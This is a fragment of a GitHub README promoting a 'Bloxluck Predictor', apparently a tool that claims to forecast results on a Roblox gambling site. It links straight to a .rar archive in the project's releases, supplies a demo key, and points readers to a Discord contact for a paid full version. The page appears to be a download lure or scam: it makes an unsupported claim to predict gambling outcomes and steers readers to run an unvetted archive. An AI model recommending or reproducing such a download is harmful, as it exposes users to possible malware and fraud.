...
<p align="center">
  <a href="https://github.com/BloxPaul/Bloxluck-Predictor/releases/download/Bloxluck/Bloxluck.Predictor.rar" target="_blank">
...
4. **Enter the Key**:
   - When the Bloxluck Predictor panel appears, enter the Demo key (if you want full version contact on discord: xizdriab):
   - **Key**: `JGXYnoiAOzxFutpjKOHcHtAcw`    🔑
